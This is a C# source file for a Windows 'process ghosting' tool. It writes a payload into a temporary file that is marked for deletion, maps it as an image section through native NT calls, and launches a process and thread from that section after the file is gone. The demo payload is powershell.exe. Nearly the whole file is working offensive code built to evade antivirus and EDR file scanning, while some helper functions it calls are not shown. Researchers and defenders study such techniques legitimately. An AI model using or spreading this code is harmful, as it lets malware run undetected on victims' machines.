using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using HANDLE = System.IntPtr;

using static ProcessGhosting.UserDefinedTypes;
using static ProcessGhosting.HelperFunctions;
namespace ProcessGhosting
{
    class Program
    {
        const int MAX_PATH = 260;

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        static extern void SetLastError(uint ErrorCode);

        [DllImport("kernel32.dll")]
        static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

        [DllImport("kernel32.dll")]
        static extern uint GetTempPath(uint nBufferLength, StringBuilder lpBuffer);

        [DllImport("kernel32.dll")]
        static extern uint GetTempFileName(string lpPathName, string lpPrefixString, uint uUnique, StringBuilder lpTempFileName);

        [DllImport("ntdll.dll")]
        //static extern NTSTATUS NtSetInformationFile(IntPtr FileHandle, out IO_STATUS_BLOCK ioStatusBlock, IntPtr FileInformation, int sizeOfInformationClass, FILE_INFORMATION_CLASS FileInformationClass);
        public static extern NTSTATUS NtSetInformationFile(IntPtr FileHandle, ref IO_STATUS_BLOCK IoStatusBlock, IntPtr FileInformation, UInt32 Length, UInt32 FileInformationClass);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenFileMapping(uint dwDesiredAccess,bool bInheritHandle,string lpName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

        //public static extern IntPtr NtOpenFile(out IntPtr FileHandle, UInt32 DesiredAccess, ref IntPtr objAttributes, out IntPtr IoStatusBlock, UInt32 ShareAccess, UInt32 OpenOptions);
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
        public static extern int NtOpenFile(out IntPtr handle, UInt32 access, ref OBJECT_ATTRIBUTES objectAttributes, out IO_STATUS_BLOCK ioStatus, FileShare share, uint openOptions);
        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtWriteFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out IntPtr ioStatusBlock, IntPtr Buffer, uint bufferLength, IntPtr Offset, IntPtr Key);

        [DllImport("ntdll.dll")]
        public static extern IntPtr NtClose(IntPtr handle);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern NTSTATUS NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        // [DllImport("ntdll.dll", SetLastError = true)] 
        // static extern IntPtr NtQueryInformationFile(IntPtr fileHandle, out IO_STATUS_BLOCK IoStatusBlock, IntPtr pInfoBlock, uint length, FILE_INFORMATION_CLASS fileInformation);

        [DllImport("ntdll.dll")]
        public static extern int NtCreateProcessEx(ref IntPtr ProcessHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, IntPtr hInheritFromProcess, uint Flags, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort, Byte InJob);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int NtQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern NTSTATUS NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetProcessId(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        internal struct FILE_DISPOSITION_INFORMATION
        {
             public Boolean DeleteFile;
        }
        /*
        static IntPtr ConvertToUnicode(string path) //Use the structure:"https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string"
        {
            Console.WriteLine("Path : " + path);
            UNICODE_STRING unicodeString = new UNICODE_STRING();
            unicodeString.Length = (ushort)(path.Length * 2);
            unicodeString.MaximumLength = (ushort)(unicodeString.Length + 2);
            unicodeString.buffer = Marshal.StringToHGlobalUni(path);

            return unicodeString.buffer;
        }*/
        static IntPtr openFile(string path)
        {
            UInt32 FILE_OPEN = 0x1;
            UInt32 OBJ_CASE_INSENSITIVE = 0x40;
            UInt32 FILE_READ_EA = 8;
            UInt32 FILE_RANDOM_ACCESS = 0x00000800;
            UInt32 FILE_DIRECTORY_FILE = 0x00000002;
            UInt32 FILE_NON_DIRECTORY_FILE = 0x00000040;
            UInt32 FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000;
            UInt32 READ_CONTROL = 0x00020000;
            UInt32 FILE_SUPERSEDE = 0x00000000;
            UInt32 FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;
            uint NT_SUCCESS = 0x0;

            IntPtr _RootHandle; //This will need to be initialized with the root handle, can use CreateFile from kernel32.dll
            _RootHandle = IntPtr.Zero;

            UNICODE_STRING unicodeString;
            RtlInitUnicodeString(out unicodeString, @"\??\" + path);
            IntPtr unicodeIntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(unicodeString));
            Marshal.StructureToPtr(unicodeString, unicodeIntPtr, false);

            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
            IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK();
            //Microsoft.Win32.SafeHandles.SafeFileHandle hFile;
            HANDLE hFile;


            objAttributes.Length = System.Convert.ToInt32(Marshal.SizeOf(objAttributes));
            objAttributes.ObjectName = unicodeIntPtr;
            objAttributes.RootDirectory = _RootHandle;
            objAttributes.Attributes = OBJ_CASE_INSENSITIVE;
            objAttributes.SecurityDescriptor = IntPtr.Zero;
            objAttributes.SecurityQualityOfService = IntPtr.Zero;

            int status = NtOpenFile(out hFile, 0x00010000 | 0x00100000 | 0x80000000 | 0x40000000, ref objAttributes, out ioStatusBlock, FileShare.Read | FileShare.Write, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT);

            return hFile;
        }
        static IntPtr MakeSectionFromDeletePendingFile(string dummy_name, IntPtr payloadPointer, int sizeShellcode)
        {
            IO_STATUS_BLOCK status_block = new IO_STATUS_BLOCK();
            FILE_DISPOSITION_INFORMATION info = new FILE_DISPOSITION_INFORMATION();
            info.DeleteFile = true;
            IntPtr iPntr = Marshal.AllocHGlobal(Marshal.SizeOf(info));

            FILE_LINK_INFORMATION fileLinkInformation = new FILE_LINK_INFORMATION();
            fileLinkInformation.ReplaceIfExists = true;
            int fileLinkInformationLen = Marshal.SizeOf(fileLinkInformation);
            IntPtr pFileLinkInformation = Marshal.AllocHGlobal(fileLinkInformationLen);


            //IntPtr FilePointer = OpenFileMapping(0x00000003, false, dummy_name);

            IntPtr hDeleteFile = openFile(dummy_name);

            //NtSetInformationFile(hDeleteFile, ref status_block, pFileLinkInformation, (UInt32)fileLinkInformationLen, 13);
            NTSTATUS status = NtSetInformationFile(hDeleteFile, ref status_block, iPntr, (UInt32)Marshal.SizeOf(info), (uint)FILE_INFORMATION_CLASS.FileDispositionInformation);
            //int shellcodeLen = Marshal.SizeOf(shellcode);
            //IntPtr shellcodePtr = Marshal.AllocHGlobal(shellcodeLen);

            //IntPtr shellcodePtr = Marshal.AllocHGlobal(2);
            long fileSize = 0;

            //NTSTATUS status = NtWriteFile(hDeleteFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref status_block, (IntPtr)shellcode[0], (uint)sizeShellcode, IntPtr.Zero, IntPtr.Zero);
            status = NtWriteFile(hDeleteFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out _, payloadPointer, (uint)sizeShellcode, IntPtr.Zero, IntPtr.Zero);

            GetFileSizeEx(hDeleteFile, out fileSize);
            HANDLE hSection = IntPtr.Zero;
            UInt32 maxsize = 0;
            status = NtCreateSection(ref hSection, (uint)SECTION_ACCESS.SECTION_ALL_ACCESS, IntPtr.Zero, maxsize, 0x00000002, 0x1000000, hDeleteFile);
            NtClose(hDeleteFile);

            return hSection;
        }
        static void Ghosting(IntPtr payloadPointer, int sizeShellcode)
        {
            StringBuilder temp_path = new StringBuilder(MAX_PATH);
            //string dummy_name = string.Empty;
            StringBuilder dummy_name = new StringBuilder(MAX_PATH);
            uint size = GetTempPath(MAX_PATH, temp_path);
            GetTempFileName(temp_path.ToString(), "TH", 0, dummy_name);
            //IntPtr hDeleteFile = CreateFile(dummy_name, FileAccess.ReadWrite, FileShare.Delete, IntPtr.Zero, FileMode.Create, FileAttributes.Normal, IntPtr.Zero);

            //MakeSectionFromDeletePendingFile(hDeleteFile, shellcode, sizeShellcode);
            IntPtr hSection = MakeSectionFromDeletePendingFile(dummy_name.ToString(), payloadPointer, sizeShellcode);

            IntPtr hProcess = IntPtr.Zero;
            int stat = NtCreateProcessEx(ref hProcess, 0x001F0FFF, IntPtr.Zero, GetCurrentProcess(), 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            uint procID = GetProcessId(hProcess);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            uint temp = 0;
            NtQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref temp);

            IntPtr payloadEp = GetEntryPoint(bi, hProcess);
            IntPtr hThread = IntPtr.Zero;

            hProcess = SetupProcessParameters(hProcess, bi, @"C:\target");
            //return;
            NTSTATUS st = NtCreateThreadEx(ref hThread, 0x1fffff, IntPtr.Zero, hProcess, payloadEp, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

        }
        static void Main(string[] args)
        {
            long sizeShellcode = 0;
            //byte[] shellcode = new byte[sizeShellcode] { };
            string filename = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            IntPtr payloadPointer = BufferPayload(filename, ref sizeShellcode);

            Ghosting(payloadPointer, (int)sizeShellcode);
        }
    }
}